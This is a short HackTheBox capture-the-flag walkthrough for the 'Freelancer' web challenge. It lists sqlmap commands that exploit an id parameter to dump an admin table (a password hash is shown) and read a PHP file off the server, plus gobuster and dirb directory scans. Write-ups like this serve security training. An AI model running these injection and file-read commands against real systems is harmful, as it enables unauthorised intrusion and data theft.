# HackTheBox : Freelancer
```
ExportIP = 167.71.140.171:30636


1. View PageSource -> Html Beautifier(https://www.cleancss.com/html-beautify/)

2. SQL Injection Point

<!-- <a href="portfolio.php?id=1">Portfolio 1</a> -->

3. Use the SQLMAP !

- sqlmap -u http://167.71.140.171:30636/portfolio.php?id=1
- sqlmap -u http://167.71.140.171:30636/portfolio.php?id=1 -D freelancer -T safeadmin --dump

: $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K

4. Scan Directory Search
- gobuster -> administrat
- dirb -> panel.php

5. read flag file 
sqlmap -u http://{{IP}}/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php

```
